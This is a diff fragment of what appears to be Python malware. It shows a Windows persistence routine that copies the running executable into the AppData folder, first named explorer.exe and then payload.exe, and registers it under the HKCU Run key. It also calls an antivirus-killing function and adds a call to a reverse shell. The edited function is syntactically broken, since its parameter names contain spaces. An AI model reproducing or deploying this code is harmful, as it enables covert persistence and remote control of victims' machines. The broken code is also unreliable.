@@ -122,14 +122,13 @@ def kill_av():
 
               
 
-
-
-def windowspersistence(time_persistent):
-       evil_file_location = os.environ["appdata"] + "\\explorer.exe"
-       if not os.path.exists(evil_file_location):
-              time.sleep(int(time_persistent))
-              shutil.copyfile(sys.executable, evil_file_location)
-              subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"',shell=True)
+def windowspersistence(time to persistent):
+       payload_location = os.environ["appdata"] + "\\payload.exe"
+       if not os.path.exists(payload_location):
+              time.sleep(int(time to persistent))
+              shutil.copyfile(sys.executable, payload_location)
+              subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + payload_location + '"',shell=True)
 
 kill_av()
+reverseshell()
 windowspersistence("TIME TO Presist")
